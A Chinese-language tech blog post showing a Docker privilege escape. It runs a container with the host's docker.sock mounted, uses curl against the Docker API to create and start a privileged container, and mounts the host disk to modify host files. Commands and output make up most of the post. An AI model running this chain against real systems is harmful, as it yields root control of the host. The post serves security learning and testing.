<!doctype html>
<html lang="zh">
<head>
<title>docker 特權逃逸</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<script async type="module">import mermaid from"https://cdn.jsdelivr.net/npm/mermaid@10/dist/mermaid.esm.min.mjs"</script>
<script async src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.25.0/prism.min.js" integrity="sha512-hpZ5pDCF2bRCweL5WoA0/N1elet1KYL5mx3LP555Eg/0ZguaHawxNvEjF6O3rufAChs16HVNhEc6blF/rZoowQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
<script async src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.25.0/plugins/autoloader/prism-autoloader.min.js" integrity="sha512-sv0slik/5O0JIPdLBCR2A3XDg/1U3WuDEheZfI/DI5n8Yqc3h5kjrnr46FGBNiUAJF7rE4LHKwQ/SoSLRKAxEA==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
<script async src="https://cdn.jsdelivr.net/npm/lucide@0.115.0/dist/umd/lucide.min.js"></script>
<script>window.addEventListener("load",(()=>{document.querySelectorAll(".callout").forEach((e=>{const t=getComputedStyle(e).getPropertyValue("--callout-icon"),l=t&&t.trim().replace(/^lucide-/,"");if(l){const t=e.querySelector(".callout-title");if(t){const e=document.createElement("div"),c=document.createElement("i");e.appendChild(c),c.setAttribute("icon-name",l),e.setAttribute("class","callout-icon"),t.insertBefore(e,t.firstChild)}}})),lucide.createIcons(),Array.from(document.querySelectorAll(".callout.is-collapsible")).forEach((e=>{e.querySelector(".callout-title").addEventListener("click",(t=>{e.classList.contains("is-collapsed")?e.classList.remove("is-collapsed"):e.classList.add("is-collapsed")}))}))}))</script>
<script async src="https://fastly.jsdelivr.net/npm/force-graph@1.43.0/dist/force-graph.min.js"></script>
<script async src="https://fastly.jsdelivr.net/npm/@alpinejs/persist@3.11.1/dist/cdn.min.js"></script>
<script src="https://fastly.jsdelivr.net/npm/alpinejs@3.11.1/dist/cdn.min.js" async></script>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.25.0/themes/prism-okaidia.min.css" integrity="sha512-mIs9kKbaw6JZFfSuo+MovjU+Ntggfoj8RwAmJbVXQ5mkAX5LlgETQEweFPI18humSPHymTb5iikEOKWF7I8ncQ==" crossorigin="anonymous" referrerpolicy="no-referrer" async>
<script src="https://fastly.jsdelivr.net/npm/whatwg-fetch@3.6.2/dist/fetch.umd.min.js" crossorigin="anonymous" referrerpolicy="no-referrer" async></script>
<link href="/styles/digital-garden-base.css" rel="stylesheet">
<link href="/styles/obsidian-base.css" rel="stylesheet">
<link href="/styles/_theme.d92311c2.css" rel="stylesheet">
<link href="/styles/custom-style.css" rel="stylesheet">
<link rel="icon" href="/favicon.ico" sizes="any">
<link rel="icon" href="/favicon.svg" type="image/svg+xml">
<link rel="apple-touch-icon" href="/apple-touch-icon.png">
<link rel="manifest" href="/manifest.webmanifest">
<style></style>
</head>
<body class="theme-dark markdown-preview-view markdown-rendered markdown-preview-section">
<nav class="navbar">
<div class="navbar-inner">
<a href="/" style="text-decoration:none">
<h1 style="margin:15px!important">Jason&#39;s tech blog</h1>
</a>
</div>
</nav>
<main class="content cm-s-obsidian">
<header>
<div class="header-meta">
</div>
</header>
<p><a class="tag" onclick="toggleTagSearch(this)" data-content="#docker">#docker</a></p>
<h2 id="起因" tabindex="-1">起因</h2>
<p>因為 docker daemon 是在 root 權限下</p>
<pre><code>$ ll -a /var/run/docker.sock
lrwxr-xr-x  1 root  daemon    63B Jun 10 23:39 /var/run/docker.sock -&gt; /Users/jason/.local/share/containers/podman/machine/podman.sock
</code></pre>
<p>所以只要能跟 host 的 docker 通訊到，就能透過 docker api 啟動特權容器，進一步取得系統資訊</p>
<p>建立特權容器</p>
<pre><code># 使用 curlimages/curl 作為基礎鏡像
FROM curlimages/curl:latest

USER root
# 安裝 sudo
RUN apk --no-cache add sudo

RUN apk --no-cache add docker

# 創建一個新用戶並設置適當的權限
RUN addgroup -S docker &amp;&amp; adduser -S dockeruser -G docker

# 允許 dockeruser 使用 sudo 而不需要密碼
RUN echo 'dockeruser ALL=(ALL) NOPASSWD:ALL' &gt;&gt; /etc/sudoers

# 切換到 dockeruser 用戶
USER dockeruser

# 設置工作目錄
WORKDIR /home/dockeruser

# 執行一個無限循環的命令，確保容器一直保持運行
CMD [&quot;sh&quot;, &quot;-c&quot;, &quot;while :; do sleep 10; done&quot;]
</code></pre>
<pre><code>docker build -t my-curl-image .
</code></pre>
<h3 id="docker-conatiner" tabindex="-1">建立 docker conatiner</h3>
<pre><code>docker run -it -v /var/run/docker.sock:/var/run/docker.sock my-curl sh
</code></pre>
<h2 id="container-docker-sock-unix-host-docker" tabindex="-1">在 container 內使用 docker.sock 的 unix 套接字與 host 的 docker 通訊</h2>
<h3 id="docker-images" tabindex="-1">建立一個 docker images</h3>
<pre><code>$ curl -X POST --unix-socket /var/run/docker.sock -d '{&quot;Image&quot;:&quot;my-curl&quot;, &quot;Privileged&quot;:true}' -H 'Content-Type: application/json' http:/v1.24/containers/create
{&quot;Id&quot;:&quot;315083c9a1035f5f7950eb3302333c17cbd4b6794c61da6be5076763a1ad3330&quot;,&quot;Warnings&quot;:[]}
</code></pre>
<h3 id="docker-images-1" tabindex="-1">啟動 docker images</h3>
<pre><code>$ curl -X POST --unix-socket /var/run/docker.sock http:/v1.24/containers/8746e88c9097720c0f6f6a0ab6f4a7fe6677b14c08df9483a71abdab7cad7cbf/start
</code></pre>
<h3 id="docker-container" tabindex="-1">列出所有 docker container 狀態</h3>
<p>等價:<br>
<code>docker ps</code></p>
<pre><code>/home/dockeruser # curl --unix-socket /var/run/docker.sock http:/v1.24/containers/json
[{&quot;Id&quot;:&quot;a9c0fe2d7af9aaf0a2154643c5155ad4eae5254d295528dab4cfde2b42fcf6fa&quot;,&quot;Names&quot;:[&quot;/elated_leakey&quot;],&quot;Image&quot;:&quot;my-curl&quot;,&quot;ImageID&quot;:&quot;sha256:77db03e61147c124f23eda7c588cbd21959fc4645462821877028c8b5236faec&quot;,&quot;Command&quot;:&quot;/entrypoint.sh sh -c 'while :; do sleep 10; done'&quot;,&quot;Created&quot;:1718034
</code></pre>
<h3 id="container" tabindex="-1">進入建立的特權 container</h3>
<pre><code>$ docker ps
CONTAINER ID   IMAGE     COMMAND                  CREATED         STATUS         PORTS     NAMES
a9c0fe2d7af9   my-curl   &quot;/entrypoint.sh sh -…&quot;   3 minutes ago   Up 3 minutes             elated_leakey

$ docker exec -it a9c0fe2d7af9 sh
</code></pre>
<h3 id="device" tabindex="-1">可以看到宿主機的 device</h3>
<pre><code>/dev # ls
autofs           hvc3             loop6            nbd3             ram1             ram9             tty14            tty27            tty4             tty52            tty8             vda
btrfs-control    hvc4             loop7            nbd4             ram10            random           tty15            tty28            tty40            tty53            tty9             vda1
bus              hvc5             mapper           nbd5             ram11            rtc0             tty16            tty29            tty41            tty54            ttyS0            vdb
cachefiles       hvc6             mem              nbd6             ram12            shm              tty17            tty3             tty42            tty55            ttyS1            vdc
core             hvc7             mqueue           nbd7             ram13            stderr           tty18            tty30            tty43            tty56            ttyS2            vga_arbiter
cpu_dma_latency  hwrng            nbd0             nbd8             ram14            stdin            tty19            tty31            tty44            tty57            ttyS3            vhost-net
cuse             kmsg             nbd1             nbd9             ram15            stdout           tty2             tty32            tty45            tty58            uinput           vhost-vsock
fd               loop-control     nbd10            net              ram2             tty              tty20            tty33            tty46            tty59            urandom          vport2p0
full             loop0            nbd11            null             ram3             tty0             tty21            tty34            tty47            tty6             vcs              vsock
fuse             loop1            nbd12            port             ram4             tty1             tty22            tty35            tty48            tty60            vcs1             zero
gpiochip0        loop2            nbd13            ppp              ram5             tty10            tty23            tty36            tty49            tty61            vcsa
hvc0             loop3            nbd14            ptmx             ram6             tty11            tty24            tty37            tty5             tty62            vcsa1
hvc1             loop4            nbd15            pts              ram7             tty12            tty25            tty38            tty50            tty63            vcsu
hvc2             loop5            nbd2             ram0             ram8             tty13            tty26            tty39            tty51            tty7             vcsu1
</code></pre>
<p>修改 host 文件</p>
<pre><code>$ mount dev/vda1 /home/vda1
/dev # ls /home/vda1
cni                 desktop-containerd  kubeadm             lost+found          mutagen             swap
containerd          docker              kubelet-plugins     machine-id          nfs                 wasm
</code></pre>
</main>
<script>window.location.hash&&document.getElementById(window.location.hash.slice(1)).classList.add("referred"),window.addEventListener("hashchange",(e=>{const t=e.oldURL.split("#");t[1]&&document.getElementById(t[1]).classList.remove("referred");const n=e.newURL.split("#");n[1]&&document.getElementById(n[1]).classList.add("referred")}),!1);const url_parts=window.location.href.split("#"),url=url_parts[0],referrence=url_parts[1];document.querySelectorAll(".cm-s-obsidian > *[id]").forEach((function(e){e.ondblclick=function(e){const t=url+"#"+e.target.id;navigator.clipboard.writeText(t)}}))</script>
<script src="https://fastly.jsdelivr.net/npm/luxon@3.2.1/build/global/luxon.min.js"></script>
<script defer="defer">TIMESTAMP_FORMAT="MMM dd, yyyy h:mm a",document.querySelectorAll(".human-date").forEach((function(e){date=e.getAttribute("data-date")||e.innerText,parsed_date=luxon.DateTime.fromISO(date),null!=parsed_date.invalid&&(parsed_date=luxon.DateTime.fromSQL(date)),null!=parsed_date.invalid&&(parsed_date=luxon.DateTime.fromHTML(date)),e.innerHTML=parsed_date.toFormat(TIMESTAMP_FORMAT)}))</script>
<script>lucide.createIcons({attrs:{class:["svg-icon"]}})</script>
</body>
</html>
